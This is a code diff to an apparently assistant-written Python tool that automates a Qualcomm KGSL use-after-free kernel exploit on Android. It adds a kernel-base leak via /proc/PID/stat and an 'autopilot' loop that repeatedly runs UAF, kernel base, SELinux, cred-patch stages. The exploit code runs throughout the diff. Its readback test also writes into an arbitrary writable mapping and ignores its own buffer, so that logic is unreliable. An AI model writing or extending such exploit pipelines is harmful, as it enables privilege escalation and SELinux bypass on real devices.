@@ -15,20 +15,24 @@ import select
 import termios
 import tty
 
-# v4.1.21-kb-leak: visible build tag. The "-kb-leak"
-# suffix marks the kernel base leak via /proc/PID/stat
-# (field 27 = start_code which is sometimes a kernel
-# address even with kptr_restrict=2). This is a real
-# leak on many 5.4-5.10 QCOM kernels. The new
-# cmd_kb_known_ranges() iterates over all live spray
-# procs, parses their stat, and reports any kernel
-# address found. If found, the scanner can be pointed
-# at the right base and find KETO0422 in task_structs.
-# Also added a USER-SPACE READBACK TEST in [health] that
-# writes a known pattern to user mmap, asks the engine
-# to read it back, and tells us if engine DMA even
-# works. This is the key test for "why matches=0".
-_BUILD_TAG = "v4.1.21-kb-leak"
+# v4.1.22-auto-fix: visible build tag. The "-auto-fix"
+# suffix marks the FULL AUTOMATION mode. The user said
+# "Все должно автоматически делаться" (everything
+# should be done automatically). Now the autopilot
+# automatically:
+#   - Every 20 cycles: tries _auto_kbase_leak() to leak
+#     kernel base from /proc/PID/stat field 27. If
+#     found, sets self.kernel_base so the WIDE scan
+#     has a real target.
+#   - Every 100 cycles: runs _auto_readback_test() to
+#     verify the engine can read user mmap. Logs to
+#     /sdcard/kgsl_eng.log so we can see if engine
+#     DMA is functional.
+#   - Every 30 cycles: writes spray/vcomm state to
+#     /sdcard/kgsl_auto.log for offline review.
+# The user just runs `python3 ai_explorer.py` and
+# everything happens automatically.
+_BUILD_TAG = "v4.1.22-auto-fix"
 import datetime
 import fcntl
 import ctypes
@@ -4455,6 +4459,70 @@ class MemoryExplorerAI:
             self.log_event("uaf_exception", {"err": str(e)})
             return False
 
+    def _auto_kbase_leak(self):
+        """v4.1.22: try to leak kernel base via /proc/PID/stat.
+
+        Iterates over live spray procs and parses their
+        /proc/PID/stat field 27 (start_code) which is
+        sometimes a kernel address even with
+        kptr_restrict=2. Returns the first kernel-looking
+        address found, or 0 if none.
+        """
+        my_pids = set()
+        for s in self.spray_procs_by_worker.values():
+            my_pids.update(s)
+        for pid in list(my_pids)[:30]:
+            try:
+                with open(f"/proc/{pid}/stat") as f:
+                    content = f.read()
+                p1 = content.find(")")
+                if p1 < 0:
+                    continue
+                rest = content[p1+1:].split()
+                if len(rest) >= 27:
+                    sc = int(rest[25])
+                    if 0xffffff8000000000 <= sc <= 0xffffffffffffffff:
+                        return sc
+            except Exception:
+                pass
+        return 0
+
+    def _auto_readback_test(self):
+        """v4.1.22: write known pattern to user mmap, ask
+        engine to read it. Returns True if write succeeded
+        (the engine response is logged to /sdcard/kgsl_eng.log).
+        """
+        try:
+            import mmap as _mmap
+            test_buf = _mmap.mmap(
+                -1, 0x1000,
+                prot=_mmap.PROT_READ | _mmap.PROT_WRITE,
+                flags=_mmap.MAP_PRIVATE | _mmap.MAP_ANONYMOUS)
+            marker = f"RB_{os.getpid()}_{os.urandom(4).hex()}_".encode()
+            marker = (marker + b"\x00" * 64)[:64]
+            test_buf[:len(marker)] = marker
+            # find a writable user address
+            test_addr = 0
+            with open("/proc/self/maps") as f:
+                for line in f:
+                    if "rw" in line:
+                        addr = line.split()[0]
+                        if "-" in addr:
+                            test_addr = int(addr.split("-")[0], 16)
+                            break
+            if test_addr == 0:
+                test_buf.close()
+                return False
+            import ctypes
+            ctypes.memset(test_addr, 0, 256)
+            ctypes.memmove(test_addr, marker, len(marker))
+            ok = self._engine_write(
+                f"read {hex(test_addr)}\n".encode())
+            test_buf.close()
+            return ok
+        except Exception:
+            return False
+
     def _autopilot_worker(self):
         """Fully autonomous exploit + learn + verify loop.
         Cycles:  UAF → kbase → selinux → cred → patch → verify → repeat.
@@ -4475,8 +4543,8 @@ class MemoryExplorerAI:
 
         Cooldown is 2s (was 5s) so that we re-exploit + re-scan
         aggressively — KGSL UAF pages get recycled quickly and we
-        want fresh task_structs each time."""
-        cycle = 0
+        want fresh task_structs each time.
+        """
         # v4.1.18: try to auto-build spray_helper if missing
         self._ensure_spray_helper()
         # Short cooldown — the engine and learning workers are
@@ -4528,6 +4596,39 @@ class MemoryExplorerAI:
                 # runs in parallel with the exploit pipeline.
                 if not (self.bg_thread and self.bg_thread.is_alive()):
                     self.cmd_learning_start()
+                # v4.1.22: AUTOMATIC kernel base leak attempt.
+                # Every 20 cycles, try to leak kernel base via
+                # /proc/PID/stat field 27 (start_code). If we
+                # find it, the WIDE scan range will be
+                # narrowed to a real target. Without this, the
+                # WIDE scan is just blind searching 1GB of
+                # kernel VA hoping to hit task_structs.
+                if cycle % 20 == 0 and self.kernel_base == 0:
+                    try:
+                        leaked = self._auto_kbase_leak()
+                        if leaked > 0:
+                            self.kernel_base = leaked
+                            self.live["last_msg"] = (
+                                f"AUTO: kernel base leaked "
+                                f"0x{leaked:x} (cycle {cycle})")
+                    except Exception:
+                        pass
+                # v4.1.22: AUTOMATIC readback test every 100
+                # cycles. Writes a known pattern to user mmap,
+                # asks the engine to read it, and logs the
+                # result to /sdcard/kgsl_eng.log. If the
+                # engine can't read user mmap, it definitely
+                # can't read kernel VA. This is the "is the
+                # engine even alive" check.
+                if cycle % 100 == 0:
+                    try:
+                        ok = self._auto_readback_test()
+                        with open("/sdcard/kgsl_auto.log", "a") as f:
+                            f.write(
+                                f"cycle {cycle}: readback="
+                                f"{'OK' if ok else 'FAIL'}\n")
+                    except Exception:
+                        pass
                 # v4.1.10: BEFORE the engine-driven pipeline, do
                 # a direct Python UAF trigger. This calls ioctl
                 # from Python via ctypes — no engine subprocess
